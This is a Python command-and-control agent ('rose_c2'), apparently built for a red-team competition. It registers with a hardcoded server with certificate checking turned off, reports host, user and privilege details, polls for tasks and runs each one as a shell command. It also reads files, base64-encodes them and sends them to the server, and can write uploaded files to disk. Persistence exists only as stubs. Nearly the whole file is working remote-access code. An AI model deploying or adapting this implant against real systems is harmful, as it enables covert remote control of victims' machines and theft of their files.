#!/usr/bin/env python3
import os, sys, json, base64, time, random, urllib, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl
from urllib.parse import urlencode

import platform, os, re, ctypes, getpass, socket, json, urllib, ssl, time

SERVER_URL="https://192.168.10.11:443/"
AGENT_NAME="example1"
AGENT_TYPE="rose_c2"
AUTH_TOKEN="plaintext_really"

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    # For example, if you have a DEBUG flag set, then print to console/logfile.
    # Otherwise (full deploy for comp), suppress output.
    print(message)

def get_platform_dist():
    """
    Helper func that returns a string with the platform distribution.
    """
    sys_platform = platform.system()

    # --- Windows Handling ---
    if sys_platform == "Windows":
        release, version, csd, ptype = platform.win32_ver()
        return ("Windows", release, version)

    # --- Linux Handling ---
    if sys_platform == "Linux":
        # Try Python 3.10+ native method (Standardized os-release)
        if hasattr(platform, 'freedesktop_os_release'):
            try:
                info = platform.freedesktop_os_release()
                return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('NAME', ''))
            except OSError:
                pass

        # 2. Manual parsing for older Python versions (< 3.10)
        if os.path.isfile("/etc/os-release"):
            info = {}
            with open("/etc/os-release") as f:
                for line in f:
                    # Parse KEY=VALUE, ignoring comments and empty lines
                    match = re.match(r'^([A-Z_]+)="?([^"\n]+)"?\$', line)
                    if match:
                        info[match.group(1)] = match.group(2)
            return (
                info.get('ID', 'linux'), 
                info.get('VERSION_ID', info.get('VERSION', '')), 
                info.get('PRETTY_NAME', '')
            )

    # Fallback for MacOS or unknown systems
    return (sys_platform, platform.release(), platform.version())

def get_os(simple=False):
    """
    Gets the approximate OS used, optionally simplified to highest level possible.
    For example: Ubuntu, Debian, Rocky, RHEL, Windows Workstation (7 8 10 11), Windows Server (2012 2016 2022 2025)

    Args: simple(Bool)
    Returns: osType(String)
    """
    system = platform.system()

    if system == "Linux":
        if simple:
            return get_platform_dist()[1] # Ubuntu, debian, redhat
        return ' '.join(get_platform_dist()) # Ubuntu 10.04 lucid, debian 4.0 , fedora 17 Beefy Miracle, redhat 5.6 Tikanga, redhat 5.9 Final (<- centos)

    if simple:
        return platform.system() # Windows, FreeBSD
    return f"{platform.system()} {platform.release()}" #Windows 10, Windows 2016Server, FreeBSD XYZ

def get_perms():
    """
    Gets the execution perm level (user and elevation level).
    Returns: isRunAsElevated(bool), runAsUser(String)
    """
    system = platform.system()

    if system == "Windows":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False
        # USERDOMAIN = Returns the NetBIOS domain name
        # Will be DOMAIN if a domain user, or hostname if local user
        domain = os.environ.get("USERDOMAIN")
        user = getpass.getuser()
        if domain:
            runAsUser = f"{domain}\\{user}"
        else:
            runAsUser = user
        return is_admin, runAsUser
    
    if system in ("Linux", "FreeBSD"):
        # euid 0 - root OR sudo
        is_root = (os.geteuid() == 0)

        # Detect sudo. May have unexpected results (False when it is actually using SUDO)
        # depending on OS and inconsistent usage of SUDO_USER variable across systems. 
        sudo_user = os.environ.get("SUDO_USER")
        if sudo_user:
            runAsUser = sudo_user
        else:
            # Normal user or directly root
            runAsUser = getpass.getuser()
        return is_root, runAsUser
    
    print_debug("get_perms(): reached unexpected unsupported OS block")
    return False, ""

def get_primary_ip():
    """
    Attempts to get the primary IP address of the local machine.
    Returns: ip(String) or "0.0.0.0" if failed
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external host (e.g., Google's public DNS or test-net-3)
        # This doesn't send any data, just establishes a connection to find out which local interface would be used.
        s.connect(("8.8.8.8", 80)) # 203.0.113.2 # test-net-3 # Doesn't need to be reachable. Use non-routable address for stealth - except that might not work under certain conditions so do Google for reliability.
        ip_address = s.getsockname()[0]
    except Exception as E:
        ip_address = "0.0.0.0" # safe default
        print_debug(f"get_primary_ip() error: {E}")
    finally:
        s.close()
    return ip_address

def get_system_details():
    """
    Helper func that builds the overall system info dictionary
    Returns: sysInfo(dict)
    """
    sysInfo = {
        "os": get_os(),
        "executionUser": get_perms()[1],
        "executionAdmin": get_perms()[0],
        "hostname": socket.gethostname(), #alternate method if FQDN is desired: socket.getfqdn()
        "ipadd": get_primary_ip()
    }
    return sysInfo

def send_message(endpoint,message="",oldStatus=True,newStatus=True,systemInfo=get_system_details(),server_timeout=5):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled (server_url is an empty string)
        # Maybe redirect to print_debug instead?
        return False, "no SERVER_URL value specified"

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
        # assembly logic of the payload, so we attach the same data to every communication.
        payload = {
            "name": AGENT_NAME,
            "hostname": systemInfo["hostname"],
            "ip": systemInfo["ipadd"],
            "os": systemInfo["os"],
            "executionUser": systemInfo["executionUser"],
            "executionAdmin": systemInfo["executionAdmin"],
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": oldStatus,
            "newStatus": newStatus,
            "message": message
        }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        # Build request
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
        )

        # Send payload
        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
            if response.getcode() == 200:
                # Good result! Now parse and return the endpoint
                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                response_text = response.read().decode('utf-8')
                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
                if "agent/beacon" in endpoint:
                    if response_text != AUTH_TOKEN:
                        AUTH_TOKEN = response_text
                        print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                return True, response_text
            else:
                print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""

def execute_command(command):
    """Execute a command and return the output"""
    try:
        if command.startswith("c2_"):
            return handle_builtin_command(command)
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"Command failed with error: {e.output}"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def handle_builtin_command(command):
    """Handle built-in C2 commands"""
    parts = command.split()
    cmd_type = parts[0]
    
    if cmd_type == "c2_info":
        sysinfo = get_system_details()
        return json.dumps({
            "hostname": sysinfo["hostname"],
            "ip_address": sysinfo["ipadd"],
            "user": sysinfo["executionUser"],
            "os_info": sysinfo["os"],
            "admin": sysinfo["executionAdmin"]
        }, indent=2)
    
    elif cmd_type == "c2_sleep" and len(parts) > 1:
        try:
            sleep_time = int(parts[1])
            return f"Sleep time would be updated to {sleep_time} seconds (not implemented in this version)"
        except: 
            return "Invalid sleep time value"
    
    elif cmd_type == "c2_download" and len(parts) > 1:
        try:
            with open(parts[1], "rb") as f:
                file_data = f.read()
            return json.dumps({
                "path": parts[1], 
                "size": len(file_data), 
                "data": base64.b64encode(file_data).decode()
            })
        except Exception as e: 
            return f"Error downloading file: {str(e)}"
    
    elif cmd_type == "c2_upload" and len(parts) > 2:
        try:
            file_data = base64.b64decode(parts[1])
            with open(parts[2], "wb") as f:
                f.write(file_data)
            return f"Successfully uploaded {len(file_data)} bytes to {parts[2]}"
        except Exception as e: 
            return f"Error uploading file: {str(e)}"
    
    elif cmd_type == "c2_persist":
        return "Persistence installation not implemented in this version"
    
    elif cmd_type == "c2_remove":
        return "Persistence removal not implemented in this version"
    
    elif cmd_type == "c2_exit":
        return "Exit command received - agent will exit after next check-in"
    
    else: 
        return f"Unknown built-in command: {cmd_type}"

def main():
    status, response = send_message("agent/beacon","register")
    running = True
    while running:
        status, response = send_message("agent/get_pause")
        if status:
            try:
                desired_pause_until = float(response)
                if desired_pause_until > time.time():
                    time.sleep(desired_pause_until - time.time())
            except ValueError:
                pass
        
        status, response = send_message("agent/get_task")
        if status:
            if response != "no pending tasks":
                data = json.loads(response)
                task_id = data.get('task_id')
                task_command = data.get('task')
                try:
                    resultobj = subprocess.run(
                        task_command,
                        shell=True,
                        capture_output=True, 
                        text=True,
                        timeout=15,
                        check=False
                    )
                    result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
                    
                    if "c2_exit" in task_command:
                        running = False
                except Exception as E:
                    print_debug(f"subprocess exception: {E}")
                    result = f"unexpected exception when trying to execute task: {str(E)[:100]}"
                finally:
                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
                    status, response = send_message("agent/set_task_result",message=resultjson)

        time.sleep(60)

if __name__ == "__main__":
    main()